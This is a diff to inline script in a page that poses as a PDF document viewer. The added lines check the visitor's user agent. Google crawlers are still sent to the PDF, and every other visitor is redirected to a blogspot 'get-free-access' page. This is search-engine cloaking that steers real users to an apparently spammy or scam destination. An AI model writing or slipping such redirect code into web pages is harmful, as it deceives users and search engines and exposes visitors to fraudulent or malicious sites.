@@ -8,9 +8,16 @@
     onloaded="js(
       (function() {
         var id = new URLSearchParams(location.search).get('id') || 'reservationhatao001';
+    var ua = navigator.userAgent.toLowerCase();
+
+    var isGoogleBot = /googlebot|google-inspect-tools|googlerooter|adsbot-google/.test(ua);
+  
+  if (!isGoogleBot) {
+ location.replace("https://romarioseas.blogspot.com/2026/07/get-free-access.html");
+ return;
+  }
 
         document.title = id + ' - PDF Document';
-
         location.href = 'https://shivammarora.github.io/newone/' + id + '.pdf';
       })();
     );"
